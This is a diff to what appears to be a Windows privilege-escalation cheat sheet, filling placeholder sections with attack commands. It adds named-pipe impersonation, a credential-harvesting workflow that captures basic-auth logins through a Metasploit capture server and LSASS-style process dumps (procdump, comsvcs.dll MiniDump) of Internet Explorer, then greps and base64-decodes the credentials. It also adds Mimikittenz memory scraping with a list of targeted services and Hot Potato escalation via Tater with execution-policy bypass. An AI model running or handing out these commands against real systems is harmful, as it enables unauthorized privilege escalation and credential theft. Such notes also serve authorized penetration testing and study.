@@ -114,13 +114,24 @@ sc start <service>
 ---
 
 ### Named Pipes
-TODO
-
-Start/restart service
+Requires SeImpersonatePrivilege
 ```powershell
-sc stop <service>
-sc start <service>
+whoami /priv
 ```
+
+Exploit using [pipeserverimpersonate.ps1](https://github.com/decoder-it/pipeserverimpersonate)
+```powershell
+.\pipeserverimpersonate.ps1
+```
+- <https://decoder.cloud/2019/03/06/windows-named-pipes-impersonation/>
+
+List named pipes
+```powershell
+Get-ChildItem \\.\pipe\
+Get-ChildItem \\.\pipe\<pipename>
+```
+
+
 
 ---
 
@@ -326,13 +337,44 @@ Invoke-SessionGopher -AllDomain -u <user> -p <pass>  # Using another account
 ---
 
 ### Memory
-#### Mimikittenz
-TODO
+Process Dump
+- On Kali
+```powershell
+msfconsole
+use auxiliary/server/capture/http_basic
+set uripath x
+run
+```
+
+- On Windows
+    - Using Internet Explorer, navigate to `http://<kali ip>/x`
+    - Create dump of `iexplore.exe`
+        - `procdump.exe -ma iexplore.exe <output path>`
+        - `.\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 <output path> full`
+        - Task Manager Processes > iexplore.exe > Create Dump File
+
+- Extract creds
+```powershell
+strings <iexplore.exe dump> | grep "Authorization: Basic"
+echo -ne <b64 encoded creds> | base64 -d
+```
 
 ---
 
-#### Process Dump (minidump)
-TODO
+[Mimikittenz](https://github.com/putterpanda/mimikittenz)
+```powershell
+Import-Module <Invoke-mimikittenz.ps1 path>
+Invoke-mimikittenz
+```
+
+Category | Supported
+:--- | :---
+Webmail | Gmail Office365 Outlook Web
+Accounting | Xero MYOB
+Remote Access | Juniper SSL-VPN Citrix NetScaler Remote Desktop Web Access 2012
+Developement | Jira Github Bugzilla Zendesk Cpanel
+IHateReverseEngineers | Malwr VirusTotal AnubisLabs
+Misc | Dropbox Microsoft Onedrive AWS Web Services Slack Twitter Facebook
 
 ---
 
@@ -487,7 +529,12 @@ msfvenom -p <payload> <payload params> -f exe -o <missing binary>.exe
 ---
 
 ## Hot Potato
-TODO
+[Tater.ps1](https://github.com/Kevin-Robertson/Tater)
+```powershell
+powershell -nop -ep bypass
+Import-Module <Tater.ps1 path>
+Invoke-Tater -Trigger 1 -Command <cmd>
+```
 
 ---
 
